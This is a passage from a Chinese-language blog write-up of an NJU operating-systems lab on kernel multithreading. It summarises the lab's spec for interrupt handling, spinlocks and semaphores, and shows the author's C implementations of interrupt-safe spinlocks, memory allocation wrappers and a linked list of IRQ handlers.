<span class="type">void</span> (*sem_init)(<span class="type">sem_t</span> *sem, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> value);</span><br><span class="line"> <span class="type">void</span> (*sem_wait)(<span class="type">sem_t</span> *sem);</span><br><span class="line"> <span class="type">void</span> (*sem_signal)(<span class="type">sem_t</span> *sem);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="OS-Operating-Systems-模块"><a href="#OS-Operating-Systems-模块" class="headerlink" title="OS(Operating Systems)模块"></a>OS(Operating Systems)模块</h3><h4 id="操作系统的主循环"><a href="#操作系统的主循环" class="headerlink" title="操作系统的主循环"></a>操作系统的主循环</h4><p>os模块是操作系统主循环的代码，主要负责系统的初始化和中断响应。在Lab1的框架代码中，已经包含如下函数：</p><ul><li><code>os-&gt;init()</code>会在系统启动时被第一个处理器调用，其是在单处理器状态下完成必要的初始化——因此无需担心数据竞争等麻烦；</li><li><code>os-&gt;run()</code>是操作系统启动后，每一个处理器必须执行的一些代码。在执行<code>os-&gt;run</code>时，操作系统已经完成了所有的初始化工作，每个处理器都会调用同一个<code>os-&gt;run</code></li></ul><p>理解os模块，要从程序执行的入口开始，以下是框架代码执行的流程：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  ioe_init();</span><br><span class="line">  cte_init(os-&gt;trap);</span><br><span class="line">  os-&gt;init();</span><br><span class="line">  mpe_init(os-&gt;run);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> 在每个处理器调用<code>os-&gt;run</code>执行后，操作系统就成为了中断处理程序。因此，当调用<code>mpe_init()</code>之后，所有处理器都开始执行<code>os-&gt;run()</code>，操作系统即正式启动，而该启动代码就成为了当前处理器上的第一个线程——这个线程是该处理器上的<strong>idle</strong>线程；而当系统中没有任何线程可以被调度时，处理器仍然需要执行点什么，直到下一个中断来临，因此该<strong>idle</strong>中断可以是一个死循环，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">os_run</span><span class="params">()</span> &#123;</span><br><span class="line"> iset(<span class="literal">true</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>主循环的另一部分是本次试验新增的中断处理程序的入口</p><ul><li><code>os-&gt;trap(ev, context)</code>：中断/异常处理程序的唯一入口。中断后，AbstractMachine会将所有寄存器保存到堆栈上，然后调用<code>os-&gt;trap</code>，并且在函数返回后，将<code>os-&gt;trap</code>返回的寄存器现场恢复到CPU上</li></ul><p>直到<code>mpe_init()</code>之前，都只有一个处理器在执行。在上述的代码中，<code>cte_init(os-&gt;trap)</code>指定了<code>os-&gt;trap()</code>是唯一的中断处理程序，所有的处理器发生中断都会统一调用<code>os-&gt;trap()</code>，这也就需要小心并发编程</p><h4 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h4><p>os模块的另一个重要功能是管理系统中的中断处理程序——我们并不希望大家在每当有一个新的功能以后，都直接去更改<code>os-&gt;trap</code>的代码，因此这里提供了另一个API:</p><ul><li><code>os-&gt;on_irq(seq, event, handler)</code>：注册一个在中断时调用的callback</li></ul><p>on_irq的含义是在<code>os-&gt;trap(ev, ctx)</code>执行时，当<strong>ev.event(事件编号)</strong>和<strong>event</strong>匹配时，调用<code>handler(event, ctx)</code>。其中：</p><ul><li><strong>seq</strong>决定了<strong>handler</strong>被调用的顺序，<strong>seq</strong>小的<strong>handler</strong>先被调用。<strong>seq</strong>相同的，按照任意顺序调用</li><li>当<strong>event == EVENT_NULL</strong>时，在任何中断/异常时都调用<strong>handler</strong></li><li>我们允许一个，且仅允许一个<strong>handler</strong>返回一个<strong>Context</strong>，在中断返回时，恢复到这个<strong>Context</strong>。当多个<strong>handler</strong>都返回<strong>context</strong>时，是<strong>undefined behavior</strong></li></ul><p>通过<code>os-&gt;on_irq</code>，我们可以注册若干中断处理程序，在适当的时机做适当的事情——这类似于<strong>面向切面编程</strong>的设计。此时，我们的os模块并不知道，也无需知道系统中有多少中断、多少设备驱动程序可能会处理终端。</p><h3 id="PMM-Physical-Memory-Management-模块"><a href="#PMM-Physical-Memory-Management-模块" class="headerlink" title="PMM(Physical Memory Management)模块"></a>PMM(Physical Memory Management)模块</h3><p>pmm与之前行为一致，但因为其被调用的场景增加了，我们需要将<code>pmm-&gt;alloc</code>和<code>pmm-&gt;free</code>更改为线程/中断安全的</p><p>具体来说，我们要求：</p><ol><li>可以再中断里调用<code>pmm-&gt;alloc()</code>和<code>pmm-&gt;free()</code>；</li><li>内存分配/回收时，简单起见，不允许被中断</li></ol><h3 id="KMT-Kernel-Multi-Threading-模块"><a href="#KMT-Kernel-Multi-Threading-模块" class="headerlink" title="KMT(Kernel Multi-Threading)模块"></a>KMT(Kernel Multi-Threading)模块</h3><h4 id="模块初始化"><a href="#模块初始化" class="headerlink" title="模块初始化"></a>模块初始化</h4><p><code>kmt-&gt;init()</code>负责初始化必要的数据，例如分配一些重要的数据结构。一般来说，要在<code>os-&gt;init()</code>时调用<code>kmt-&gt;init()</code>。整个系统启动只调用一次<code>kmt-&gt;init()</code></p><h4 id="线程管理"><a href="#线程管理" class="headerlink" title="线程管理"></a>线程管理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  (*create)(<span class="type">task_t</span> *task, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> (*entry)(<span class="type">void</span> *arg), <span class="type">void</span> *arg);</span><br><span class="line"><span class="type">void</span> (*teardown)(<span class="type">task_t</span> *task);</span><br></pre></td></tr></table></figure><p>其中<code>create</code>在系统中创建一个线程，该线程立即就可以被调度执行。这里可以认为通过<code>create</code>创建的线程永不返回——但其有可能在永远不会被调度执行的情况下被<code>kmt-&gt;teardown</code>函数回收<br><code>teardown</code>回收相应的为线程分配的资源——例如为<strong>task_t</strong>动态分配的内存。需要注意的是，线程只有永远不会被调度到处理器上执行的前提下，才能被回收，即可以认为回收的线程不再持有任何自旋锁或在信号量上等待</p><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*spin_init)(<span class="type">spinlock_t</span> *lk, <span class="type">const</span> <span class="type">char</span> *name);</span><br><span class="line"><span class="type">void</span> (*spin_lock)(<span class="type">spinlock_t</span> *lk);</span><br><span class="line"><span class="type">void</span> (*spin_unlock)(<span class="type">spinlock_t</span> *lk);</span><br></pre></td></tr></table></figure><p>上述代码用来保护一段强原子性的代码(任何其他线程、中断处理程序、其他处理器都不能同时得到同一把锁)</p><ul><li>允许在中断处理程序中调用自旋锁</li><li>允许任意在任意处理器的任意线程中调用自旋锁</li><li><code>spin_lock</code>将会关闭处理器的中断，因此对一个处理器而言，持有任何一个自旋锁之后就不会再发生线程切换</li><li><code>spin_unlock</code>在解除最后一个当前处理器持有的自旋锁之后，需要将处理器的中断状态恢复。例如在中断处理程序中，中断是关闭的，则<code>spin_unlock</code>不应该打开中断<h4 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*sem_init)(<span class="type">sem_t</span> *sem, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> value);</span><br><span class="line"><span class="type">void</span> (*sem_wait)(<span class="type">sem_t</span> *sem);</span><br><span class="line"><span class="type">void</span> (*sem_signal)(<span class="type">sem_t</span> *sem);</span><br></pre></td></tr></table></figure></li></ul><p>在信号量初始化时，<strong>value</strong>指定了其初始化的数值。如果<strong>value</strong>==1,可以把信号量当做互斥锁；如果<strong>value</strong>==0，可以把信号量当做生产者-消费者缓冲区管理实现。而<code>sem_wait</code>和<code>sem_signal</code>分别对应的P/V操作</p><ul><li>允许在线程中执行信号量的<code>sem_wait</code>操作。在<code>P</code>操作执行没有相应资源时，线程将被阻塞(不再被调度执行)。中断没有对应的线程、不能阻塞，因此不能在中断时调用 <code>sem_wait</code></li><li>允许在任意状态下任意执行<code>sem_signal</code>，包括任何处理器中的任何线程和任何处理器的任何中断。</li></ul><h3 id="正确性标准"><a href="#正确性标准" class="headerlink" title="正确性标准"></a>正确性标准</h3><h4 id="Safety和Liveness"><a href="#Safety和Liveness" class="headerlink" title="Safety和Liveness"></a>Safety和Liveness</h4><p>在任意时刻，操作系统中都可能有多个线程，你需要设计调度的策略，在多个处理器中调度这些线程，使操作系统能够被执行的线程尽可能不发生饥饿</p><h4 id="官方测试用例"><a href="#官方测试用例" class="headerlink" title="官方测试用例"></a>官方测试用例</h4><p>官方测试用例使该程序看起来更像一个操作系统，虽然其并不能作为”压力测试”来帮助检查kmt实现的正确性。<br>其提供了<strong>dev</strong>模块及其实现，并包含了以下设备的驱动：</p><ul><li>input，支持读取键盘的输入</li><li>fb，支持一个软件模拟的2D显示加速器的写入</li><li>tty1，tty2，两个支持读写的虚拟终端，使用Alt-1，Alt-2在虚拟终端之间切换</li><li>sda，支持读写的物理磁盘。<br>在代码合并后，需要在<strong>os-&gt;init()</strong>中手工添加设备模块的初始化<code>dev-&gt;init()</code>。如果实现正确，即可完成中断处理程序和相关线程的初始化。<br>此后，就可以创建若干访问设备的线程，样例如下所示<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tty_reader</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"> <span class="type">device_t</span> *tty = dev-&gt;lookup(arg);</span><br><span class="line"> <span class="type">char</span> cmd[<span class="number">128</span>], resp[<span class="number">128</span>], ps[<span class="number">16</span>];</span><br><span class="line"> <span class="built_in">snprintf</span>(ps, <span class="number">16</span>, <span class="string">&quot;(%s) $ &quot;</span>, arg);</span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">   tty-&gt;ops-&gt;write(tty, <span class="number">0</span>, ps, <span class="built_in">strlen</span>(ps));</span><br><span class="line">   <span class="type">int</span> nread = tty-&gt;ops-&gt;read(tty, <span class="number">0</span>, cmd, <span class="keyword">sizeof</span>(cmd) - <span class="number">1</span>);</span><br><span class="line">   cmd[nread] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(resp, <span class="string">&quot;tty reader task: got %d character(s).\n&quot;</span>, <span class="built_in">strlen</span>(cmd));</span><br><span class="line">   tty-&gt;ops-&gt;write(tty, <span class="number">0</span>, resp, <span class="built_in">strlen</span>(resp));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">os_init</span><span class="params">()</span> &#123;</span><br><span class="line"> ...</span><br><span class="line"> kmt-&gt;create(task_alloc(), <span class="string">&quot;tty_reader&quot;</span>, tty_reader, <span class="string">&quot;tty1&quot;</span>);</span><br><span class="line"> kmt-&gt;create(task_alloc(), <span class="string">&quot;tty_reader&quot;</span>, tty_reader, <span class="string">&quot;tty2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><h3 id="在Bug中活下来"><a href="#在Bug中活下来" class="headerlink" title="在Bug中活下来"></a>在Bug中活下来</h3><p>  实际上，Lab2希望可以在多处理器、中断都存在的情况下，仍然能保持正确。或许，只有在做完实验以后，才能对下面这些话产生真正的理解：</p><ol><li>代码可以再多个处理器上被<strong>同时</strong>调用。因此需要小心地保证原子性、顺序性以及可见性。千万小心<code>kmt-&gt;create()</code>、<code>kmt-&gt;sem_signal()</code>等所有函数可能同时在多个处理器上被调用</li><li>在中断处理程序中，可以调用自旋锁。实际上，一个CPU的中断处理程序可以和另一个CPU访问同一个共享数据结构。因此自旋锁是保证正确性的重要手段</li><li><p>小心数据竞争。一切共享的数据都可能产生数据竞争——如果没有保护好的话。有些内存访问悄悄在意向不到的时候发生，例如对堆栈的访问</p><p>为此，实验中反复强调，通过一些手段，可以非常方便的帮助我们调试程序</p></li></ol><ul><li>通过预编译选项，控制log的输出，如下所示<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TRACE_F</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> TRACE_ENTRY printf(<span class="string">&quot;[trace] %s:entry\n&quot;</span>, __func__)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> TRACE_EXIT printf(<span class="string">&quot;[trace] %s:exit\n&quot;</span>, __func__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> TRACE_ENTRY ((void)0)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> TRACE_EXIT ((void)0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">  TRACE_ENTRY;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is f.\n&quot;</span>);</span><br><span class="line">  TRACE_EXIT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>使用gdb进行调试。qemu提供了非常丰富的命令行选项<ul><li><strong>-gdb</strong>，启动调试模式</li><li><strong>-S</strong>，让虚拟机在收到调试命令前不执行</li><li>在gdb中使用<strong>target</strong>命令连接远程调试</li><li>使用<strong>.gdbinit</strong>/<strong>-x</strong>/<strong>-ex</strong>，实现gdb脚本的预先执行</li></ul></li><li>防御式编程。通过类似于<strong>fences</strong>、<strong>canaries</strong>、<strong>assert</strong>等，帮助我们更快的定义bug</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  切换到<strong>master</strong>分支，然后从github上拉取<strong>L2</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy L2</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面式个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/c0af5895bd1d90f4c86a3073ab528c6ee131a9a4">实验实现</a></p><h3 id="自旋锁-1"><a href="#自旋锁-1" class="headerlink" title="自旋锁"></a>自旋锁</h3><p>  实验指南中要求可以在任意处理器中调用自旋锁，这样可能就会导致一个问题<br>  如果一个进程持有自旋锁<strong>lock</strong>。此时发生中断，而在中断处理程序中，同样请求了该自旋锁<strong>lock</strong>，则CPU就会阻塞在这里。</p><p>  为了避免这种情况，实验指南要求，在获取自旋锁时，还需要同时关闭中断；在释放自旋锁时，恢复中断情况。</p><p>  也就是说，申请或释放自旋锁时的时候，还需要保存和恢复中断情况。而这里有一个细节——即保存和恢复中断操作，与原子交换锁的操作的先后顺序。</p><p>  由于自旋锁是可以并行的，如果我们首先保存状态，再原子交换，此时可能所有程序都执行了保存状态操作，从而互相覆盖掉状态；如果先原子交换，再关闭和保存状态，则刚刚执行完原子交换操作，在关闭中断前发生了中断，从而可能导致前面所说的中断处理程序的死锁。</p><p>  下面是实现的自旋锁部分的逻辑<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_spin_init</span><span class="params">(<span class="type">spinlock_t</span> *lk, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(lk == <span class="literal">NULL</span>, <span class="string">&quot;error lk&quot;</span>);</span><br><span class="line"></span><br><span class="line">    lk-&gt;name = name;</span><br><span class="line">    lk-&gt;lock = KMT_UNLOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 实现自旋锁</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 根据实验指南说明，可以在任意位置调用自旋锁</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 因此，考虑到如果在一个进程在占用了自旋锁，然后切换到中断处理程序中，该中断处理程序同样会可能也会该调用自旋锁</span></span><br><span class="line"><span class="comment"> * 从而导致了死锁</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 因此，其应该首先关闭中断，然后在占用自旋锁。并且在占用自旋锁期间，不能调用yield进行切换</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 考虑到可能多个cpu同是调用相同的自旋锁，因此其保存当前中断状态应该在获取锁之后，否则状态可能被覆盖掉 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_spin_lock</span><span class="params">(<span class="type">spinlock_t</span> *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(lk == <span class="literal">NULL</span>, <span class="string">&quot;error lk&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 关闭中断</span></span><br><span class="line"><span class="comment">     * 避免死锁产生</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> saved_ienabled_status = ienabled();</span><br><span class="line">    iset(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="type">atomic_xchg</span>(&amp;(lk-&gt;lock), KMT_LOCKED) == KMT_LOCKED) &#123;;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在这里保存关闭中断之前的状态</span></span><br><span class="line"><span class="comment">     * 否则可能中断状态可能会被覆盖掉</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    lk-&gt;saved_ienabled_status = saved_ienabled_status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 只需要反向spin_lock中的操作即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 首先保存之前的中断状态，然后释放锁</span></span><br><span class="line"><span class="comment"> * 此时，其他进程可以任意修改锁锁的状态，并不影响当前进程的状态</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 最后，回复中断状况，这样子确保不会死锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_spin_unlock</span><span class="params">(<span class="type">spinlock_t</span> *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(ienabled() != <span class="literal">false</span>, <span class="string">&quot;error ienabled()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> saved_ienabled_status = lk-&gt;saved_ienabled_status;</span><br><span class="line">    panic_on(<span class="type">atomic_xchg</span>(&amp;(lk-&gt;lock), KMT_UNLOCK) != KMT_LOCKED, <span class="string">&quot;did not locked the lock&quot;</span>);</span><br><span class="line"></span><br><span class="line">    iset(saved_ienabled_status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  可以看到，虽然代码部分是并行的，但是栈空间不共享。因此首先通过变量保存其中断状态，然后关闭中断。此时在执行原子交换，由于已经关闭了中断，不可能发生死锁。最后，由于已经获取了锁，再保存中断状态就不会被覆盖掉了</p><h3 id="安全内存分配"><a href="#安全内存分配" class="headerlink" title="安全内存分配"></a>安全内存分配</h3><p>  在L1中，我们的预期场景中，并没有开启CPU的中断响应。而在L2中，我们会开启中断响应，这可能会给L1中实现的代码带来一些麻烦——例如一个进程可能由多个cpu分段执行，从而导致cpu_current不一致。</p><p>  根据实验指南所属，为了方便起见，直接在内存分配/回收时，关闭中断响应即可，包装如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由于CPU可能被中断(主要是时钟中断、外设等中断)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这就给原本的内存分配和释放带来严重的问题</span></span><br><span class="line"><span class="comment"> * 其一个进程可能会由多个cpu执行，则cpu_current()并不能表示当前执行的cpu，从而产生意外</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 为了解决该问题，在执行内存分配或释放的时候，直接关闭中断即可。这样子不会有时钟中断、外设中断等</span></span><br><span class="line"><span class="comment"> * 而内存分配或释放自己本身不会去调用中断等，从而确保了和L1中是一样的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc_safe</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> saved_ienabled_status = ienabled();</span><br><span class="line">  iset(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *res = kalloc(size);</span><br><span class="line"></span><br><span class="line">  panic_on(ienabled() != <span class="literal">false</span>, <span class="string">&quot;error ienbled&quot;</span>);</span><br><span class="line">  iset(saved_ienabled_status);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 类似于前面的kalloc_safe</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 为了确保不会被中断</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">kfree_safe</span><span class="params">(<span class="type">void</span> *chunk)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> saved_ienabled_status = ienabled();</span><br><span class="line">  iset(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  kfree(chunk);</span><br><span class="line"></span><br><span class="line">  panic_on(ienabled() != <span class="literal">false</span>, <span class="string">&quot;error ienbled&quot;</span>);</span><br><span class="line">  iset(saved_ienabled_status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="中断处理程序-1"><a href="#中断处理程序-1" class="headerlink" title="中断处理程序"></a>中断处理程序</h3><p>  根据实验指南，要求可以任意的注册若干中断处理程序。对于这种动态结构，自然可以通过链表进行管理，中断处理程序的相关结构体如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/include/os.h</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQ</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> seq;</span><br><span class="line">        <span class="type">int</span> event;</span><br><span class="line">        <span class="type">handler_t</span> handler;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">IRQ</span> *<span class="title">next</span>;</span></span><br><span class="line">    &#125; Irq;</span><br><span class="line"></span><br><span class="line"><span class="comment">//kernel/src/os.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 用来注册中断处理程序</span></span><br><span class="line"><span class="comment"> * 这里按照实验指南中的提示</span></span><br><span class="line"><span class="comment"> * 使用单向链表进行管理即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 由于其不需要线程/中断安全的，就非常简单的链表操作即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Irq irqs = &#123;</span><br><span class="line">  .seq = MAGIC_SEQ,</span><br><span class="line">  .event = MAGIC_EVENT,</span><br><span class="line">  .handler = MAGIC_HANDLER,</span><br><span class="line">  .next = <span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h4 id="注册中断处理程序"><a href="#注册中断处理程序" class="headerlink" title="注册中断处理程序"></a>注册中断处理程序</h4><p>  注册中断处理程序很简单，就是在链表尾部添加节点即可，逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_irq</span><span class="params">(<span class="type">int</span> seq, <span class="type">int</span> event, <span class="type">handler_t</span> handler)</span> &#123;</span><br><span class="line"></span><br><span class="line">  panic_on(handler == <span class="literal">NULL</span>, <span class="string">&quot;error handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">  Irq *iter = &amp;irqs;</span><br><span class="line">  panic_on(iter-&gt;seq != MAGIC_SEQ, <span class="string">&quot;error seq&quot;</span>);</span><br><span class="line">  